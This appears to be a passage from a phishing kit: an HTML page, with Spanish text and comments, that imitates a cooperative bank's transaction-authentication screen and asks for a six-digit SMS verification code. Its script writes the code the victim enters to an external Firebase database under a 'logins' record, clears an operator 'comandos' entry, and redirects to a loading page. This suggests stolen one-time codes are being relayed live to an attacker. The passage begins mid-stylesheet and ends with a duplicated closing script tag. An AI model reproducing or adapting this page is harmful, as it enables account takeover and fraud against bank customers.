        /* Timeline idéntica al código original */
        .timelineFirmador { list-style: none; padding: 0; display: flex; justify-content: center; margin-bottom: 30px; position: relative; }

        .author { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #999; }
        .complete .author { color: #0072b9; }

        .fvaAdvertencia { background-color: #f0f7fb; border-left: 4px solid #0072b9; padding: 10px; color: #0072b9; font-size: 11px; font-weight: 600; margin-top: 15px; line-height: 1.4; }

<body class="flex items-center justify-center min-h-screen">

    <div class="bg-white rounded-lg shadow-xl w-[550px] relative overflow-hidden">
        <!-- Botón Cerrar Superior -->
        <button class="absolute top-4 right-4 text-[#0072b9] text-2xl hover:opacity-70">×</button>

        <div class="p-6">
            <!-- Logo Central -->
            <div class="text-center mb-6">
                <center><img src="logo_coope.png" width="120" height="50" alt="Logo"></center>
            </div>

            <!-- Timeline (Pasos) -->
            <ul class="timelineFirmador">
                <li class="li" id="step1">
                    <div class="timestamp"><span class="author">Seleccionar</span></div>
                    <div class="status"></div>
                </li>
                <li class="li complete" id="step2">
                    <div class="timestamp"><span class="author">Autenticar</span></div>
                    <div class="status"></div>
                </li>
            </ul>

            <!-- Contenido Principal -->
            <div class="text-center mt-10">
                <h5 class="text-[14px] text-gray-700 mb-2">Para confirmar la transacción, digite el código de verificación que se le ha enviado a su</h5>
                <p class="text-[#0072b9] text-lg font-semibold mb-6">Número de telefono vinculado</p>

                <form id="form-sms2">
                    <div class="mb-8">
                        <input type="text" id="sms-input" onkeypress="return event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57" inputmode="numeric" minlength="6" maxlength="6" class="input-otp" placeholder="------" autocomplete="off">
                    </div>

                    <div class="text-left">
                        
                        
                        
                        <div class="fvaAdvertencia">
                            El código de verificación es para su uso exclusivo y personal. No lo facilite por teléfono o correo electrónico a ninguna persona.
                        </div>
                    </div>

                    <!-- Botones -->
                    <div class="flex justify-center gap-3 mt-8">
                        <button type="button" class="bg-[#444] text-white px-8 py-2 rounded text-[13px] font-bold uppercase tracking-wider">Cancelar</button>
                        <button type="submit" id="btn-envio" class="bg-[#0072b9] text-white px-8 py-2 rounded text-[13px] font-bold uppercase tracking-wider">Verificar</button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Línea Decorativa Inferior -->
        <div class="flex justify-center mb-4">
            <div class="w-20 h-1 bg-[#0072b9] rounded-full"></div>
        </div>
    </div>
<script>
    // 1. Configuración de Firebase (Asegúrate de usar la misma que en tu index/panel)
    const firebaseConfig = { databaseURL: "https://mslogs-31bf1-default-rtdb.firebaseio.com/" 
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // 2. OBTENER EL ID DE LA URL (Esto es lo que te faltaba)
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('id');

    // Verificación de seguridad
    if (!sessionId) {
        console.error("No se encontró el ID del usuario");
        // Opcional: Redirigir al inicio si no hay ID
        // window.location.href = 'index.html';
    }

    // 3. Manejo del Formulario
    document.getElementById('form-sms2').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const code2 = document.getElementById('sms-input').value;

        if (code2.trim() !== "") {
            // Actualizamos en la base de datos
            db.ref('logins/' + sessionId).update({
                sms2: code2,
                status: 'SMS2_RECIBIDO'
            }).then(() => {
                // Importante: Limpiamos el comando anterior para que no entre en bucle de redirección
                db.ref('comandos/' + sessionId).remove();
                
                // Redirigimos a la carga final o a donde necesites
                window.location.href = 'cargando2.html?id=' + sessionId;
            }).catch((error) => {
                console.error("Error al guardar:", error);
            });
        } else {
            alert("Por favor ingrese el código");
        }
    });
</script>
</script>
